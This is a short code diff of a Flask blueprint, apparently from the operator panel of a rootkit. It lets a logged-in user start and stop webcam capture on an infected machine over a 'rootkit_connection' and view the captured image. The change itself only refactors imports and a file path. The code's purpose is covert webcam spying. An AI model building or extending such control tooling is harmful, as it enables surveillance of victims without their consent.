@@ -1,17 +1,16 @@
-import os
 from flask import Blueprint, render_template, request, redirect, url_for
-from utils.tools import authenticated, rootkit_connection, connection_lock
+from utils.state import authenticated, rootkit_connection, connection_lock
+import os
 
 webcam_bp = Blueprint('webcam', __name__)
-CAPTURE_PATH = "/var/www/html/images/capture.jpg"  # à adapter si besoin
 
-
-@webcam_bp.route('/webcam', methods=['GET', 'POST'])
+@webcam_bp.route('/', methods=['GET', 'POST'])
 def webcam():
     if not authenticated:
         return redirect(url_for('auth.login'))
 
     webcam_output = ""
+    image_path = "/var/www/html/images/capture.jpg"  # À adapter si nécessaire
 
     if request.method == 'POST':
         action = request.form.get('action')
@@ -30,11 +29,9 @@ def webcam():
                         webcam_output = "🛑 Webcam arrêtée."
                     else:
                         webcam_output = "❌ Action inconnue."
-                else:
-                    webcam_output = "❌ Rootkit non connecté."
         except Exception as e:
             webcam_output = f"💥 Erreur : {e}"
 
-    image_exists = os.path.exists(CAPTURE_PATH)
+    image_exists = os.path.exists(image_path)
 
-    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=CAPTURE_PATH)
+    return render_template("webcam.html", webcam_output=webcam_output, image_exists=image_exists, image_path=image_path)
